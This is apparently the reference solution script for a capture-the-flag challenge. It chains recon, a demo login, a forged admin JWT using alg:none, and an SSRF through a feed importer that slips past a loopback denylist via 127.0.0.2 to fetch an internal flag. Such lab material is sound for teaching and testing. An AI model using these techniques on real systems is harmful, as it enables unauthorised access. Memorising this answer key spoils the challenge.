"""Reference solution for the Foresight Track A challenge.

Runs the five-stage attack chain against a live target and returns the
transcript plus the captured flag (if any). See solution/walkthrough.md
for the narrative explanation of each stage.

Note on the SSRF bypass host: the loopback denylist in
challenge/app/server.py blocks any host string containing "127.0.0.1" or
"localhost". "http://127.0.0.2:9000/" is a distinct loopback address that
does not match either substring, so it slips past the filter while still
routing to the same host's loopback interface where the internal engine
listens on 0.0.0.0:9000. (The classic short-form bypass "127.1" is not
used here because it does not resolve on Windows.)
"""

import os
import re
import sys

import jwt
import requests

SSRF_BYPASS_HOST = "http://127.0.0.2:9000"


def solve(base_url: str) -> dict:
    log = []

    def rec(label, text):
        log.append(f"[{label}] {text}")

    # Stage 1 (s1_recon): hit the public JSON API surface.
    r = requests.get(f"{base_url}/api/v1/forecasts", timeout=5)
    rec("recon", r.text)

    # Stage 2 (s2_analyst): log in with the demo analyst credentials and
    # confirm the session via /me.
    tok = requests.post(
        f"{base_url}/api/v1/auth/login",
        json={"username": "analyst", "password": "analyst"},
        timeout=5,
    ).json()["token"]
    me = requests.get(
        f"{base_url}/api/v1/me",
        headers={"Authorization": f"Bearer {tok}"},
        timeout=5,
    )
    rec("analyst", me.text)

    # Stage 3 (s3_admin): forge an admin token via alg:none, with the
    # mfa claim set to satisfy the admin_gate MFA check.
    forged = jwt.encode({"sub": "analyst", "role": "admin", "mfa": True}, key="", algorithm="none")
    ah = {"Authorization": f"Bearer {forged}"}
    feeds = requests.get(f"{base_url}/api/v1/admin/feeds", headers=ah, timeout=5)
    rec("admin", feeds.text)

    # Stage 4 (s4_ssrf): use the admin-only feed importer to SSRF into
    # the internal engine, bypassing the loopback denylist with 127.0.0.2.
    ssrf = requests.post(
        f"{base_url}/api/v1/admin/feeds/import",
        json={"url": f"{SSRF_BYPASS_HOST}/"},
        headers=ah,
        timeout=5,
    )
    rec("ssrf", ssrf.text)

    # Stage 5 (s5_flag): pivot the same SSRF primitive to the internal
    # flag path.
    flagres = requests.post(
        f"{base_url}/api/v1/admin/feeds/import",
        json={"url": f"{SSRF_BYPASS_HOST}/internal/flag"},
        headers=ah,
        timeout=5,
    )
    rec("flag", flagres.text)

    transcript = "\n".join(log)
    m = re.search(r"flag\{[a-z0-9_]+\}", transcript)
    return {"transcript": transcript, "flag": m.group(0) if m else None}


if __name__ == "__main__":
    out = solve(os.environ.get("BASE_URL", "http://localhost:8080"))
    print(out["transcript"])
    print("FLAG:", out["flag"])
    sys.exit(0 if out["flag"] else 1)
